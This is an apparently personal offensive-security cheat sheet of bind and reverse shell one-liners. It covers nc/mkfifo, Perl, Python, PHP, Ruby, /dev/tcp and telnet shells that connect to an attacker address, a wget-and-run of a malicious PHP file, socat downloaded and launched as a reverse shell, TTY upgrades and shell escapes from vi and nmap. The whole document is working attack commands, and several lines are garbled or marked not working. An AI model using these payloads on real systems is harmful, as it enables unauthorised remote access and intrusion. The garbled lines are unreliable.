BASH

bind
from victim a <public> (a-to-b) b got shell of a
a: 
rm -f /tmp/htoo; mkfifo /tmp/htoo; cat /tmp/htoo | /bin/sh -i 2>&1 | nc -l 4456 > /tmp/htoo
b:
nc -v $aip 4456

reverse
from victim b <private> (b-to-a) a got shell of b
a: 
nv -lvvp 4456
b: 
rm -f /tmp/htoo; mkfifo /tmp/htoo; cat /tmp/htoo | /bin/sh -i 2>&1 | nc -nv $aip 4456 > /tmp/htoo




*   Perl
    *   perl -e 'use Socket;$i=10.0.0.1;$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname(tcp));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,>&S);open(STDOUT,>&S);open(STDERR,>&S);exec(/bin/sh -i);};'


*   Python
    *   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'


*   PHP
    *   php -r '$sock=fsockopen(10.0.0.1,1234);exec(/bin/bash -i <&3 >&3 2>&3);'


*   RUBY
    *   ruby -rsocket -e'f=TCPSocket.open(127.0.0.1,443).to\_i;exec sprintf(/bin/sh -i <&%d >&%d 2>&%d,f,f,f)'
        *   not working

# GET TTY SESSION for victim terminal

# In reverse shell 
```bash
$ python -c 'import pty; pty.spawn(/bin/bash)'
Ctrl-Z
```

# In Kali
```bash
$ stty raw -echo
$ fg
```

# In reverse shell
```bashh
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 38 columns 116
```




##############################################################





#1 
nc <attacker_ip> <port> -e /bin/bash 
#2 
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#3 
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
#4
mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe 
#5 
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
#7 
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php

SOCAT
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 

#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 



python -c 'import pty; pty.spawn(/bin/bash)' 
perl -e 'exec/bin/sh;'

{


********************************************************




Shell Spawning

python -c'import pty; pty.spawn(/bin/sh)'
echoos.system('/bin/bash')
/bin/sh-i
perlâ€”e 'exec /bin/sh;'
perl: exec/bin/sh; 
ruby: exec/bin/sh
lua: os.execute('/bin/sh')
(From within IRB) exec/bin/sh
(From within vi) :!bash
(From within vi) :set shell=/bin/bash:shell 
(From within nmap) !sh






